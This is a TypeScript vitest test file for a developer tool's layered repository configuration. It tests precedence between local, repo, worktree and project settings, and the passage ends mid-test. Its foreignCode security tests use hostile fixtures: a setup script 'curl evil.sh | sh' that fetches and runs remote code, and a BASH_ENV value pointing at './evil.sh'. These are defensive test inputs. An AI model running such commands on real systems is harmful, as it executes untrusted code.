import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdirSync, rmSync, readFileSync, writeFileSync, existsSync } from "node:fs";
import { join } from "node:path";
import { homedir, tmpdir } from "node:os";

// Mock paths + git so repo-config resolves against tmp dirs and a stubbed git
const MOCK_DEV3_HOME = join(tmpdir(), `dev3-home-test-${process.pid}`);
vi.mock("../paths", () => ({ DEV3_HOME: join(tmpdir(), `dev3-home-test-${process.pid}`) }));
const { detectDefaultCompareRef, resolveConfiguredCompareRef } = vi.hoisted(() => ({
	detectDefaultCompareRef: vi.fn().mockResolvedValue("origin/main"),
	resolveConfiguredCompareRef: vi.fn(async (_path: string, _base: string, configured: string) => configured),
}));

vi.mock("../git", () => ({
	detectDefaultCompareRef,
	resolveConfiguredCompareRef,
	projectSlug: (p: string) => p.replace(/^\//, "").replaceAll("/", "-"),
}));

import {
	loadRepoConfig,
	loadRepoConfigRaw,
	loadLocalConfigRaw,
	saveRepoConfig,
	saveRepoLocalConfig,
	ensureGitignore,
	getConfigSources,
	resolveConfigProvenance,
	resolveProjectConfig,
	resolveOperationalProjectConfig,
	migrateProjectConfig,
	resolveProjectEnv,
	hasRepoConfig,
	hasLocalConfig,
	saveConfigToWinningLayer,
} from "../repo-config";
import type { Project, Dev3RepoConfig } from "../../shared/types";

const TEST_DIR = join(tmpdir(), `dev3-repo-config-test-${process.pid}`);

function makeProject(overrides: Partial<Project> = {}): Project {
	return {
		id: "test-id",
		name: "test-project",
		path: TEST_DIR,
		setupScript: "npm install",
		devScript: "npm run dev",
		cleanupScript: "echo done",
		defaultBaseBranch: "main",
		clonePaths: ["node_modules"],
		createdAt: "2026-01-01",
		peerReviewEnabled: true,
		...overrides,
	};
}

beforeEach(() => {
	mkdirSync(TEST_DIR, { recursive: true });
	mkdirSync(MOCK_DEV3_HOME, { recursive: true });
	detectDefaultCompareRef.mockResolvedValue("origin/main");
	detectDefaultCompareRef.mockClear();
});

afterEach(() => {
	rmSync(TEST_DIR, { recursive: true, force: true });
	rmSync(MOCK_DEV3_HOME, { recursive: true, force: true });
});

describe("loadRepoConfig", () => {
	it("returns empty object when no files exist or the JSON is corrupt", async () => {
		expect(await loadRepoConfig(TEST_DIR)).toEqual({});
		mkdirSync(join(TEST_DIR, ".dev3"), { recursive: true });
		writeFileSync(join(TEST_DIR, ".dev3", "config.json"), "not json at all");
		expect(await loadRepoConfig(TEST_DIR)).toEqual({});
	});

	it("merges config.local.json on top of config.json and ignores unknown keys", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			setupScript: "bun install",
			defaultBaseBranch: "develop",
			cleanupScript: "echo cleanup",
			unknownKey: "should be ignored",
		}));
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({
			setupScript: "npm install",
		}));

		const config = await loadRepoConfig(TEST_DIR);
		expect(config.setupScript).toBe("npm install"); // local overrides
		expect(config.defaultBaseBranch).toBe("develop"); // from repo
		expect(config.cleanupScript).toBe("echo cleanup"); // from repo
		expect((config as any).unknownKey).toBeUndefined(); // unknown keys are dropped
	});

	it("ignores unknown keys in config files", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			setupScript: "bun install",
			unknownKey: "should be ignored",
		}));

		const config = await loadRepoConfig(TEST_DIR);
		expect(config.setupScript).toBe("bun install");
		expect((config as any).unknownKey).toBeUndefined();
	});
});

describe("loadRepoConfigRaw / loadLocalConfigRaw", () => {
	it("returns {} for missing files, then the raw file contents", () => {
		expect(loadRepoConfigRaw(TEST_DIR)).toEqual({});
		expect(loadLocalConfigRaw(TEST_DIR)).toEqual({});
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({ setupScript: "repo" }));
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({ setupScript: "local" }));

		expect(loadRepoConfigRaw(TEST_DIR)).toEqual({ setupScript: "repo" });
		expect(loadLocalConfigRaw(TEST_DIR)).toEqual({ setupScript: "local" });
	});
});

describe("saveRepoConfig / saveRepoLocalConfig", () => {
	it("creates .dev3 and writes config.json (plus the gitignore entry), then config.local.json", async () => {
		const config: Dev3RepoConfig = {
			setupScript: "bun install",
			defaultBaseBranch: "main",
		};

		await saveRepoConfig(TEST_DIR, config);

		const filePath = join(TEST_DIR, ".dev3", "config.json");
		expect(existsSync(filePath)).toBe(true);
		const written = JSON.parse(readFileSync(filePath, "utf-8"));
		expect(written.setupScript).toBe("bun install");
		expect(readFileSync(join(TEST_DIR, ".gitignore"), "utf-8")).toContain(".dev3/config.local.json");

		await saveRepoLocalConfig(TEST_DIR, { setupScript: "local-script" });

		const localPath = join(TEST_DIR, ".dev3", "config.local.json");
		expect(JSON.parse(readFileSync(localPath, "utf-8")).setupScript).toBe("local-script");
	});
});

describe("ensureGitignore", () => {
	it("appends to an existing .gitignore, idempotently", async () => {
		writeFileSync(join(TEST_DIR, ".gitignore"), "node_modules\n");

		await ensureGitignore(TEST_DIR);

		const gitignore = readFileSync(join(TEST_DIR, ".gitignore"), "utf-8");
		expect(gitignore).toContain("node_modules");
		expect(gitignore).toContain(".dev3/config.local.json");

		// Idempotent — a second run does not duplicate the entry.
		await ensureGitignore(TEST_DIR);
		const matches = readFileSync(join(TEST_DIR, ".gitignore"), "utf-8").match(/\.dev3\/config\.local\.json/g);
		expect(matches?.length).toBe(1);
	});
});

describe("getConfigSources", () => {
	it("returns [] without files, then repo / local per field", async () => {
		expect(await getConfigSources(TEST_DIR)).toEqual([]);
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			setupScript: "bun install",
		}));

		const sources = await getConfigSources(TEST_DIR);

		const setupSource = sources.find((s) => s.field === "setupScript");
		expect(setupSource?.source).toBe("repo");

		// Fields not in any config file should not appear
		const devSource = sources.find((s) => s.field === "devScript");
		expect(devSource).toBeUndefined();

		// A field in config.local.json reports local.
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({
			setupScript: "npm install",
		}));

		const withLocal = await getConfigSources(TEST_DIR);
		expect(withLocal.find((s) => s.field === "setupScript")?.source).toBe("local");
	});
});

describe("resolveConfigProvenance", () => {
	it("attributes every key when no config files exist (project / default / unset)", async () => {
		const project = makeProject();
		const resolved = await resolveProjectConfig(project);
		const prov = resolveConfigProvenance(resolved, project);

		// Values carried on the Project object (projects.json) → "project"
		expect(prov.setupScript).toBe("project");
		expect(prov.cleanupScript).toBe("project");
		expect(prov.defaultBaseBranch).toBe("project");
		expect(prov.clonePaths).toBe("project");
		expect(prov.peerReviewEnabled).toBe("project");

		// Values that only exist because of DEFAULTS / derivation → "default"
		expect(prov.setupScriptLaunchMode).toBe("default");
		expect(prov.autoReviewEnabled).toBe("default");
		expect(prov.sparseCheckoutEnabled).toBe("default");
		expect(prov.sparseCheckoutPaths).toBe("default");
		expect(prov.defaultCompareRef).toBe("default"); // derived origin/main

		// No value at any layer and no default → "unset" (CLI renders "(not set)")
		expect(prov.defaultCompareRefMode).toBe("unset");
		expect(prov.portCount).toBe("unset");
		expect(prov.builtinColumnAgents).toBe("unset");
	});

	it("labels file-backed keys local/repo and treats a phantom empty array as unconfigured", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			setupScript: "bun install",
			sparseCheckoutPaths: [], // empty array must NOT claim the key (see effective())
			portCount: 2,
		}));
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({
			devScript: "bun run dev:local",
		}));

		const project = makeProject();
		const resolved = await resolveProjectConfig(project);
		const prov = resolveConfigProvenance(resolved, project);

		expect(prov.setupScript).toBe("repo");
		expect(prov.devScript).toBe("local"); // local layer wins over project
		expect(prov.portCount).toBe("repo");
		// sparseCheckoutPaths [] in the file is "not configured" → falls through
		expect(prov.sparseCheckoutPaths).toBe("default");
		expect(prov.clonePaths).toBe("project");
		expect(resolved.clonePaths).toEqual(["node_modules"]);
	});

	it("attributes an explicit clonePaths [] to the file that set it (#2026)", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		const project = makeProject({ clonePaths: ["build"] });

		writeFileSync(join(configDir, "config.json"), JSON.stringify({ clonePaths: [] }));
		let resolved = await resolveProjectConfig(project);
		expect(resolved.clonePaths).toEqual([]);
		expect(resolveConfigProvenance(resolved, project).clonePaths).toBe("repo");

		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({ clonePaths: [] }));
		resolved = await resolveProjectConfig(project);
		expect(resolveConfigProvenance(resolved, project).clonePaths).toBe("local");
	});

	it("lets extraFolders [] in config.local.json hide a committed list", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({ extraFolders: ["../shared"] }));
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({ extraFolders: [] }));
		const resolved = await resolveProjectConfig(makeProject());
		expect(resolved.extraFolders).toEqual([]);
	});
});

describe("resolveProjectConfig", () => {
	it("returns defaults for a project with default-like values", async () => {
		const project = makeProject({
			setupScript: "",
			devScript: "",
			cleanupScript: "",
			clonePaths: [],
			defaultBaseBranch: "main",
		});
		const resolved = await resolveProjectConfig(project);
		expect(resolved.setupScript).toBe("");
		expect((resolved as any).setupScriptLaunchMode).toBe("parallel");
		expect(resolved.defaultBaseBranch).toBe("main");
		expect(resolved.defaultCompareRef).toBe("origin/main");
		expect(resolved.autoReviewEnabled).toBe(false);
		expect(resolved.peerReviewEnabled).toBe(true);
		expect(resolved.clonePaths).toEqual([]);
		expect(detectDefaultCompareRef).toHaveBeenCalledWith(TEST_DIR, "main");
	});

	it("replaces a configured compare ref the repo does not have with the detected one", async () => {
		resolveConfiguredCompareRef.mockImplementationOnce(async () => "origin/main");
		const project = makeProject({ defaultCompareRef: "origin/master" });
		const resolved = await resolveProjectConfig(project);
		expect(resolveConfiguredCompareRef).toHaveBeenCalledWith(project.path, "main", "origin/master");
		expect(resolved.defaultCompareRef).toBe("origin/main");
	});

	it("validates the origin/<base> that defaultCompareRefMode remote implies", async () => {
		resolveConfiguredCompareRef.mockImplementationOnce(async () => "main");
		mkdirSync(join(TEST_DIR, ".dev3"), { recursive: true });
		writeFileSync(join(TEST_DIR, ".dev3", "config.json"), JSON.stringify({ defaultCompareRefMode: "remote" }));
		const resolved = await resolveProjectConfig(makeProject({ defaultCompareRef: undefined }));
		expect(resolved.defaultCompareRef).toBe("main");
	});

	it("respects project-level defaultCompareRef when no file configs set it", async () => {
		const project = makeProject({ defaultCompareRef: "origin/develop" });
		const resolved = await resolveProjectConfig(project);
		expect(resolved.defaultCompareRef).toBe("origin/develop");
		expect(detectDefaultCompareRef).not.toHaveBeenCalled();
	});

	it("uses repo config values over project values", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			setupScript: "bun install",
			defaultBaseBranch: "develop",
		}));

		const project = makeProject();
		const resolved = await resolveProjectConfig(project);
		expect(resolved.setupScript).toBe("bun install");
		expect(resolved.defaultBaseBranch).toBe("develop");
		expect(resolved.defaultCompareRef).toBe("origin/main");
		expect(detectDefaultCompareRef).toHaveBeenCalledWith(TEST_DIR, "develop");
		// Non-configured fields fall back to project values (level 4)
		expect(resolved.cleanupScript).toBe("echo done");
	});

	it("applies priority local > repo > project > default without mutating the project", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			setupScript: "repo-script",
			devScript: "repo-dev",
			defaultCompareRef: "develop",
		}));
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({
			setupScript: "local-script",
		}));

		const project = makeProject();
		const resolved = await resolveProjectConfig(project);
		expect(resolved.setupScript).toBe("local-script"); // local wins
		expect(resolved.devScript).toBe("repo-dev"); // repo
		expect(resolved.defaultCompareRef).toBe("develop"); // repo
		expect(resolved.cleanupScript).toBe("echo done"); // project object
		expect(resolved.sparseCheckoutEnabled).toBe(false); // default
		expect(project.setupScript).toBe("npm install"); // original unchanged
	});
});

describe("migrateProjectConfig", () => {
	it("creates config.json from project settings when no config exists", async () => {
		const project = makeProject({
			setupScript: "bun install",
			cleanupScript: "rm -rf dist",
			defaultBaseBranch: "develop",
			env: { PERSONAL_VALUE: "local" },
		});

		await migrateProjectConfig(project);

		const filePath = join(TEST_DIR, ".dev3", "config.json");
		expect(existsSync(filePath)).toBe(true);
		const written = JSON.parse(readFileSync(filePath, "utf-8"));
		expect(written.setupScript).toBe("bun install");
		expect(written.cleanupScript).toBe("rm -rf dist");
		expect(written.defaultBaseBranch).toBe("develop");
		expect(written.env).toBeUndefined();
	});

	it("skips if config.local.json or config.json already exists", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({ setupScript: "local" }));
		await migrateProjectConfig(makeProject({ setupScript: "should-not-migrate" }));
		expect(existsSync(join(configDir, "config.json"))).toBe(false);
		rmSync(join(configDir, "config.local.json"));

		writeFileSync(join(configDir, "config.json"), JSON.stringify({ setupScript: "existing" }));

		const project = makeProject({ setupScript: "should-not-overwrite" });
		await migrateProjectConfig(project);

		const written = JSON.parse(readFileSync(join(configDir, "config.json"), "utf-8"));
		expect(written.setupScript).toBe("existing");
	});

	it("writes nothing when env is the only non-default setting, or the project folder is gone", async () => {
		const project = makeProject({
			setupScript: "",
			devScript: "",
			cleanupScript: "",
			clonePaths: [],
			defaultBaseBranch: "main",
			peerReviewEnabled: true,
			env: { PERSONAL_VALUE: "local" },
		});

		await migrateProjectConfig(project);

		expect(existsSync(join(TEST_DIR, ".dev3", "config.json"))).toBe(false);

		// Nor does it recreate a deleted project folder.
		const missingPath = join(TEST_DIR, "deleted-project");
		await migrateProjectConfig(makeProject({ path: missingPath, setupScript: "bun install" }));
		expect(existsSync(missingPath)).toBe(false);
	});
});

describe("resolveProjectConfig — deleted project folder resilience", () => {
	it("falls back to the base branch when detection fails, and skips it for a missing folder", async () => {
		detectDefaultCompareRef.mockRejectedValue(new Error("spawn failed"));

		const project = makeProject({ defaultCompareRef: undefined });
		const resolved = await resolveProjectConfig(project);

		expect(resolved.defaultCompareRef).toBe("main");

		// A missing project folder skips detection entirely.
		detectDefaultCompareRef.mockClear();
		const gone = await resolveProjectConfig(makeProject({ path: join(TEST_DIR, "gone"), defaultCompareRef: undefined }));
		expect(detectDefaultCompareRef).not.toHaveBeenCalled();
		expect(gone.defaultCompareRef).toBe("main");
	});
});

describe("hasRepoConfig / hasLocalConfig", () => {
	it("reports each file independently", () => {
		expect(hasRepoConfig(TEST_DIR)).toBe(false);
		expect(hasLocalConfig(TEST_DIR)).toBe(false);
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), "{}");
		expect(hasRepoConfig(TEST_DIR)).toBe(true);
		expect(hasLocalConfig(TEST_DIR)).toBe(false);
		writeFileSync(join(configDir, "config.local.json"), "{}");
		expect(hasLocalConfig(TEST_DIR)).toBe(true);
	});
});

describe("resolveProjectConfig with configPath override (worktree)", () => {
	const WORKTREE_DIR = join(tmpdir(), `dev3-worktree-test-${process.pid}`);

	beforeEach(() => {
		mkdirSync(WORKTREE_DIR, { recursive: true });
	});

	afterEach(() => {
		rmSync(WORKTREE_DIR, { recursive: true, force: true });
	});

	it("reads config from worktree path instead of project.path, falling back to project values", async () => {
		// Main project has no .dev3/
		const project = makeProject({ name: "my-project", id: "proj-42" });
		// No worktree .dev3/ yet → project values.
		expect((await resolveProjectConfig(project, WORKTREE_DIR)).setupScript).toBe("npm install");

		// Worktree has .dev3/config.json
		const wtConfigDir = join(WORKTREE_DIR, ".dev3");
		mkdirSync(wtConfigDir, { recursive: true });
		writeFileSync(join(wtConfigDir, "config.json"), JSON.stringify({
			setupScript: "worktree-setup",
			defaultBaseBranch: "feature-branch",
		}));

		const resolved = await resolveProjectConfig(project, WORKTREE_DIR);
		expect(resolved.setupScript).toBe("worktree-setup");
		expect(resolved.defaultBaseBranch).toBe("feature-branch");
		expect(resolved.name).toBe("my-project");
		expect(resolved.id).toBe("proj-42");
	});
});

describe("migrateProjectConfig with configPath override", () => {
	const WORKTREE_DIR = join(tmpdir(), `dev3-migrate-wt-test-${process.pid}`);

	beforeEach(() => {
		mkdirSync(WORKTREE_DIR, { recursive: true });
	});

	afterEach(() => {
		rmSync(WORKTREE_DIR, { recursive: true, force: true });
	});

	it("migrates to worktree path when configPath is provided", async () => {
		const project = makeProject({
			setupScript: "bun install",
			defaultBaseBranch: "develop",
		});

		await migrateProjectConfig(project, WORKTREE_DIR);

		const filePath = join(WORKTREE_DIR, ".dev3", "config.json");
		expect(existsSync(filePath)).toBe(true);
		const written = JSON.parse(readFileSync(filePath, "utf-8"));
		expect(written.setupScript).toBe("bun install");

		// Original project.path should NOT have config
		expect(existsSync(join(TEST_DIR, ".dev3", "config.json"))).toBe(false);
	});
});

describe("resolveProjectConfig — explicit empty clonePaths (#2026)", () => {
	it("clonePaths [] (or a non-empty list) in repo config overrides project values", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			setupScript: "bun install",
			clonePaths: [],
		}));

		const project = makeProject({ clonePaths: ["node_modules", "build"] });
		const resolved = await resolveProjectConfig(project);
		expect(resolved.clonePaths).toEqual([]);

		// A non-empty repo list overrides the project values just the same.
		writeFileSync(join(configDir, "config.json"), JSON.stringify({ clonePaths: ["vendor"] }));
		expect((await resolveProjectConfig(project)).clonePaths).toEqual(["vendor"]);
	});

	it("clonePaths [] in local config overrides a non-empty repo config", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({ clonePaths: ["build"] }));
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({ clonePaths: [] }));

		const project = makeProject({ clonePaths: ["node_modules"] });
		const resolved = await resolveProjectConfig(project);
		expect(resolved.clonePaths).toEqual([]);
		expect((await getConfigSources(TEST_DIR)).find((s) => s.field === "clonePaths")?.source).toBe("local");
	});

	it("a non-empty local config still beats clonePaths [] in repo config", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({ clonePaths: [] }));
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({ clonePaths: [".env"] }));

		const resolved = await resolveProjectConfig(makeProject({ clonePaths: ["node_modules"] }));
		expect(resolved.clonePaths).toEqual([".env"]);
	});

	it("an explicit [] in a file also wins a Project Settings save of clonePaths", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.local.json"), JSON.stringify({ clonePaths: [] }));

		const leftover = await saveConfigToWinningLayer(TEST_DIR, { clonePaths: ["node_modules"] });
		expect(leftover).toEqual({});
		expect(JSON.parse(readFileSync(join(configDir, "config.local.json"), "utf-8")).clonePaths).toEqual(["node_modules"]);
	});

	it("empty sparseCheckoutPaths in repo config falls through to project values", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			sparseCheckoutPaths: [],
		}));

		const project = makeProject({ sparseCheckoutPaths: ["src/", "tests/"] });
		const resolved = await resolveProjectConfig(project);
		expect(resolved.sparseCheckoutPaths).toEqual(["src/", "tests/"]);
	});

	it("worktree with phantom empty sparseCheckoutPaths falls through to project values", async () => {
		const WORKTREE = join(tmpdir(), `dev3-cow-wt-test-${process.pid}`);
		mkdirSync(WORKTREE, { recursive: true });

		const wtConfigDir = join(WORKTREE, ".dev3");
		mkdirSync(wtConfigDir, { recursive: true });
		writeFileSync(join(wtConfigDir, "config.json"), JSON.stringify({
			setupScript: "bun install",
			sparseCheckoutPaths: [],
		}));

		const project = makeProject({ sparseCheckoutPaths: ["src/"] });
		const resolved = await resolveProjectConfig(project, WORKTREE);
		expect(resolved.sparseCheckoutPaths).toEqual(["src/"]);

		rmSync(WORKTREE, { recursive: true, force: true });
	});
});

describe("getConfigSources — provenance", () => {
	it("empty sparseCheckoutPaths in repo config is not reported as source (#378)", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({
			sparseCheckoutPaths: [],
		}));

		const sources = await getConfigSources(TEST_DIR);
		expect(sources.find((s) => s.field === "sparseCheckoutPaths")).toBeUndefined();
	});

	it("explicit clonePaths [] in repo config is reported as source (#2026)", async () => {
		const configDir = join(TEST_DIR, ".dev3");
		mkdirSync(configDir, { recursive: true });
		writeFileSync(join(configDir, "config.json"), JSON.stringify({ clonePaths: [] }));

		const sources = await getConfigSources(TEST_DIR);
		expect(sources.find((s) => s.field === "clonePaths")?.source).toBe("repo");
	});
});

describe("resolveOperationalProjectConfig — worktree + main cascade", () => {
	const WT_DIR = join(tmpdir(), `dev3-op-wt-${process.pid}`);

	function writeCfg(dir: string, file: "config.json" | "config.local.json", obj: Record<string, unknown>): void {
		const d = join(dir, ".dev3");
		mkdirSync(d, { recursive: true });
		writeFileSync(join(d, file), JSON.stringify(obj));
	}

	beforeEach(() => { mkdirSync(WT_DIR, { recursive: true }); });
	afterEach(() => { rmSync(WT_DIR, { recursive: true, force: true }); });

	it("no worktree path, or worktreePath === project.path → single-path resolution", async () => {
		writeCfg(TEST_DIR, "config.json", { setupScript: "main-setup" });
		expect((await resolveOperationalProjectConfig(makeProject())).setupScript).toBe("main-setup");
		expect((await resolveOperationalProjectConfig(makeProject(), TEST_DIR)).setupScript).toBe("main-setup");
	});

	// Scenario 1: main has NO .dev3 config; worktree has config.json + config.local.json.
	it("main has no config: worktree provides scripts AND non-scripts; local beats repo", async () => {
		writeCfg(WT_DIR, "config.json", { setupScript: "wt-setup", devScript: "wt-dev-repo", portCount: 3 });
		writeCfg(WT_DIR, "config.local.json", { devScript: "wt-dev-local" });

		// Project object keeps its own scripts (makeProject defaults) — worktree must win.
		const project = makeProject({ cleanupScript: "proj-cleanup" });
		const resolved = await resolveOperationalProjectConfig(project, WT_DIR);

		expect(resolved.setupScript).toBe("wt-setup");        // worktree repo beats project object
		expect(resolved.devScript).toBe("wt-dev-local");      // worktree local beats worktree repo
		expect(resolved.portCount).toBe(3);                   // non-script field from worktree
		expect(resolved.cleanupScript).toBe("proj-cleanup");  // unset in worktree/main → project object

		// Scenario 2a: once main HAS config, the worktree still outranks it for every
		// field, scripts included (the inversion).
		writeCfg(TEST_DIR, "config.json", { setupScript: "main-setup", devScript: "main-dev", portCount: 9 });
		const withMain = await resolveOperationalProjectConfig(project, WT_DIR);
		expect(withMain.setupScript).toBe("wt-setup");
		expect(withMain.devScript).toBe("wt-dev-local");
		expect(withMain.portCount).toBe(3);
	});

	// Scenario 2b: main config.local.json (level 3) fills a field the worktree omits,
	// and beats main config.json (level 4).
	it("main config.local.json fills fields the worktree does not set", async () => {
		writeCfg(WT_DIR, "config.json", { setupScript: "wt-setup" });
		writeCfg(TEST_DIR, "config.local.json", { devScript: "main-local-dev" });
		writeCfg(TEST_DIR, "config.json", { devScript: "main-repo-dev" });

		const resolved = await resolveOperationalProjectConfig(makeProject({ devScript: "" }), WT_DIR);
		expect(resolved.setupScript).toBe("wt-setup");      // level 2
		expect(resolved.devScript).toBe("main-local-dev");  // level 3 beats level 4
	});

	it("main config.json (level 4) reaches a config-less worktree for non-script fields and beats the project object", async () => {
		writeCfg(TEST_DIR, "config.json", { portCount: 7, setupScript: "L4-main-repo" });
		// WT_DIR has no .dev3
		const resolved = await resolveOperationalProjectConfig(makeProject({ setupScript: "L5-project" }), WT_DIR);
		expect(resolved.portCount).toBe(7);
		expect(resolved.setupScript).toBe("L4-main-repo");
	});

	// The exact shape of the "Setup Dev Server" false prompt: config.local.json is
	// gitignored, so it exists only in the main checkout. A worktree-only
	// resolution reports no dev server for a project that starts one fine, which
	// is why every task-scoped consumer must use THIS resolver.
	it("a devScript only in the main checkout's local config is invisible to worktree-only resolution", async () => {
		writeCfg(TEST_DIR, "config.local.json", { devScript: "bun run dev" });
		const project = makeProject({ devScript: "" });

		const worktreeOnly = await resolveProjectConfig(project, WT_DIR);
		const operational = await resolveOperationalProjectConfig(project, WT_DIR);

		expect(worktreeOnly.devScript).toBe("");
		expect(operational.devScript).toBe("bun run dev");
	});

	it("honours full precedence wt-local > wt-repo > main-local > main-repo > project", async () => {
		writeCfg(WT_DIR, "config.local.json", { setupScript: "L1-wt-local" });
		writeCfg(WT_DIR, "config.json", { setupScript: "L2-wt-repo" });
		writeCfg(TEST_DIR, "config.local.json", { setupScript: "L3-main-local" });
		writeCfg(TEST_DIR, "config.json", { setupScript: "L4-main-repo" });
		const project = makeProject({ setupScript: "L5-project" });

		const resolved = await resolveOperationalProjectConfig(project, WT_DIR);
		expect(resolved.setupScript).toBe("L1-wt-local");
	});

	// Empty arrays are "not configured" across the combined cascade too (#378).
	it("phantom empty sparseCheckoutPaths in worktree falls through to main config.json", async () => {
		writeCfg(WT_DIR, "config.json", { sparseCheckoutPaths: [] });
		writeCfg(TEST_DIR, "config.json", { sparseCheckoutPaths: ["main-src/"] });
		const project = makeProject({ sparseCheckoutPaths: ["proj-src/"] });
		const resolved = await resolveOperationalProjectConfig(project, WT_DIR);
		expect(resolved.sparseCheckoutPaths).toEqual(["main-src/"]);
	});

	// …but clonePaths [] is an explicit "clone nothing" at whichever layer sets it (#2026).
	it("explicit clonePaths [] in main local config beats main repo config and the project", async () => {
		writeCfg(TEST_DIR, "config.local.json", { clonePaths: [] });
		writeCfg(TEST_DIR, "config.json", { clonePaths: ["main-cache"] });
		const project = makeProject({ clonePaths: ["build"] });
		const resolved = await resolveOperationalProjectConfig(project, WT_DIR);
		expect(resolved.clonePaths).toEqual([]);
	});

	it("explicit clonePaths [] committed in the worktree beats main and the project", async () => {
		writeCfg(WT_DIR, "config.json", { clonePaths: [] });
		writeCfg(TEST_DIR, "config.json", { clonePaths: ["main-cache"] });
		const resolved = await resolveOperationalProjectConfig(makeProject({ clonePaths: ["build"] }), WT_DIR);
		expect(resolved.clonePaths).toEqual([]);
	});

	it("a worktree non-empty clonePaths still beats a main clonePaths []", async () => {
		writeCfg(WT_DIR, "config.json", { clonePaths: ["node_modules"] });
		writeCfg(TEST_DIR, "config.local.json", { clonePaths: [] });
		const resolved = await resolveOperationalProjectConfig(makeProject({ clonePaths: ["build"] }), WT_DIR);
		expect(resolved.clonePaths).toEqual(["node_modules"]);
	});

	it("auto-detects defaultCompareRef using the worktree path", async () => {
		writeCfg(WT_DIR, "config.json", { setupScript: "wt-setup" });
		const resolved = await resolveOperationalProjectConfig(makeProject({ defaultCompareRef: undefined }), WT_DIR);
		expect(resolved.defaultCompareRef).toBe("origin/main");
		expect(detectDefaultCompareRef).toHaveBeenCalledWith(WT_DIR, "main");
	});

	// foreignCode — the security boundary. The worktree stands on someone else's
	// branch, so its committed config may not hand dev3 anything that executes.
	describe("foreignCode worktree", () => {
		it("ignores every command-bearing field from the worktree, keeps main's", async () => {
			writeCfg(TEST_DIR, "config.json", {
				setupScript: "main-setup",
				devScript: "main-dev",
				cleanupScript: "main-cleanup",
				setupScriptLaunchMode: "blocking",
				builtinColumnAgents: { "review-by-ai": { agentId: "main-agent" } },
			});
			writeCfg(WT_DIR, "config.json", {
				setupScript: "curl evil.sh | sh",
				devScript: "wt-dev",
				cleanupScript: "wt-cleanup",
				setupScriptLaunchMode: "parallel",
				builtinColumnAgents: { "review-by-ai": { agentId: "wt-agent" } },
			});

			const resolved = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: true });
			expect(resolved.setupScript).toBe("main-setup");
			expect(resolved.devScript).toBe("main-dev");
			expect(resolved.cleanupScript).toBe("main-cleanup");
			expect(resolved.setupScriptLaunchMode).toBe("blocking");
			expect(resolved.builtinColumnAgents).toEqual({ "review-by-ai": { agentId: "main-agent" } });
		});

		it("still takes non-executing fields from the worktree", async () => {
			writeCfg(TEST_DIR, "config.json", { portCount: 9, clonePaths: ["main-cache"] });
			writeCfg(WT_DIR, "config.json", { portCount: 2, clonePaths: ["wt-cache"], defaultBaseBranch: "develop" });

			const resolved = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: true });
			expect(resolved.portCount).toBe(2);
			expect(resolved.clonePaths).toEqual(["wt-cache"]);
			expect(resolved.defaultBaseBranch).toBe("develop");
		});

		// A fresh worktree has no config.local.json — but the file is only gitignored
		// when dev3 wrote that rule, so a foreign repo may well have committed one.
		// Both worktree layers are therefore untrusted, not just the repo one.
		it("ignores commands from the worktree's config.local.json too", async () => {
			writeCfg(TEST_DIR, "config.json", { setupScript: "main-setup" });
			writeCfg(WT_DIR, "config.local.json", { setupScript: "wt-local-setup" });

			const resolved = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: true });
			expect(resolved.setupScript).toBe("main-setup");
		});

		it("drops the worktree's env keys while keeping main's", async () => {
			writeCfg(TEST_DIR, "config.json", { env: { SHARED: "main", MAIN_ONLY: "main" } });
			writeCfg(WT_DIR, "config.json", { env: { SHARED: "wt", BASH_ENV: "./evil.sh" } });

